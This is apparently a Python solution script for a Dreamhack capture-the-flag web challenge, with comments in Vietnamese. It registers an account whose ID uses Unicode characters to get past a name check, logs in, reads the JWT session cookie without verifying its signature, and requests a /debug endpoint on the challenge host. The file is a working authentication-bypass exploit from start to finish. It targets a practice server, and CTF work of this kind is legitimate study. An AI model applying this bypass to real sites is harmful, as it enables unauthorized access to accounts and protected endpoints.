import requests
import jwt

class Exploit:
    def __init__(self, baseURL):
        self.baseURL = baseURL.rstrip("/")
        self.id = "Korea_pocas"   # bypass check với ký tự Unicode
        self.password = "p"
        self.register_path = "/register"
        self.login_path = "/login"
        self.debug_path = "/debug"
        self.session = requests.Session()

    def register(self):
        data = {
            "name": "p",
            "id": self.id,
            "pw": self.password,
            "rpw": self.password
        }
        resp = self.session.post(f"{self.baseURL}{self.register_path}", data=data)
        print(f"[+] Register request sent, status={resp.status_code}")
        return resp

    def login(self):
        data = {
            "id": self.id,
            "pw": self.password
        }
        # disable redirect to see Set-Cookie
        resp = self.session.post(f"{self.baseURL}{self.login_path}", data=data, allow_redirects=False)
        print(f"[+] Login response status: {resp.status_code}")
        print("[*] Set-Cookie header:", resp.headers.get("Set-Cookie"))
        print("[*] Cookies in session:", self.session.cookies.get_dict())

        # lấy JWT trong cookie
        token = self.session.cookies.get("user")
        if token:
            print("[*] Got JWT token:", token)
            decoded = jwt.decode(token, options={"verify_signature": False})
            print("[*] JWT payload:", decoded)
            return token
        else:
            print("[-] No JWT token found in cookies")
            return None

    def debug(self):
        resp = self.session.get(f"{self.baseURL}{self.debug_path}")
        print(f"[+] /debug status={resp.status_code}")
        print("[+] /debug body:\n", resp.text[:100])  

if __name__ == "__main__":
    BASE_URL = "http://host8.dreamhack.games:16937"
    exploit = Exploit(BASE_URL)
    exploit.register()
    token = exploit.login()
    exploit.debug()
